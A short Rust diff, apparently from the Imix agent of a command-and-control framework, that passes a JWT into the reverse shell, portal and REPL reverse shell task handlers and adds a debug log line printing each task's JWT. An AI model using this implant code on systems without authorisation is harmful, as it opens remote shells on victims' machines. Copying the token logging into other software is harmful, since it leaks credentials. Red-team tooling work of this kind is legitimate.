@@ -175,6 +175,9 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         let registry = self.task_registry.clone();
         let agent = Arc::new(self.clone());
         for task in tasks {
+            #[cfg(debug_assertions)]
+            log::info!("Claimed task {}: JWT={}", task.id, task.jwt);
+
             registry.spawn(task, agent.clone());
         }
         Ok(())
@@ -286,22 +289,22 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         Ok(c2::ReportTaskOutputResponse {})
     }
 
-    fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
+    fn start_reverse_shell(&self, task_id: i64, jwt: String, cmd: Option<String>) -> Result<(), String> {
         self.spawn_subtask(task_id, move |transport| async move {
-            run_reverse_shell_pty(task_id, cmd, transport).await
+            run_reverse_shell_pty(task_id, jwt, cmd, transport).await
         })
     }
 
-    fn create_portal(&self, task_id: i64) -> Result<(), String> {
+    fn create_portal(&self, task_id: i64, jwt: String) -> Result<(), String> {
         self.spawn_subtask(task_id, move |transport| async move {
-            run_create_portal(task_id, transport).await
+            run_create_portal(task_id, jwt, transport).await
         })
     }
 
-    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
+    fn start_repl_reverse_shell(&self, task_id: i64, jwt: String) -> Result<(), String> {
         let agent = self.clone();
         self.spawn_subtask(task_id, move |transport| async move {
-            run_repl_reverse_shell(task_id, transport, agent).await
+            run_repl_reverse_shell(task_id, jwt, transport, agent).await
         })
     }
 
